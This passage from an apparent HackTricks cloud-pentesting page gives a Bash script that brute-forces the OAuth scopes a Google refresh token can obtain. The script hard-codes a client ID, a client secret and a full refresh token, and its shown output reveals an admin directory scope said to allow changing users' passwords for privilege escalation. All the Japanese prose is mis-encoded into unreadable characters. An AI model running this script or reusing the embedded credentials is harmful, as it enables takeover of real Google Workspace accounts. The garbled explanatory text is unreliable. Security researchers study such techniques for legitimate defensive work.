<summary>ã‚¹ã‚³ãƒ¼ãƒ—ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ãŸã‚ã®Bashã‚¹ã‚¯ãƒªãƒ—ãƒˆ</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

ãã—ã¦ã€ã“ã‚ŒãŒåŸ·ç­†æ™‚ã«å¾—ã‚‰ã‚ŒãŸå‡ºåŠ›ã§ã™ï¼š
```
https://www.googleapis.com/auth/admin.directory.user
```
ã©ã®ã‚¹ã‚³ãƒ¼ãƒ—ã‚‚æŒ‡å®šã—ãªã„å ´åˆã¨åŒã˜ã§ã™ã€‚

{% hint style="danger" %}
ã“ã®ã‚¹ã‚³ãƒ¼ãƒ—ã§ã¯ã€**æ—¢å­˜ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã—ã¦æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚
{% endhint %}

## å‚è€ƒæ–‡çŒ®

* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
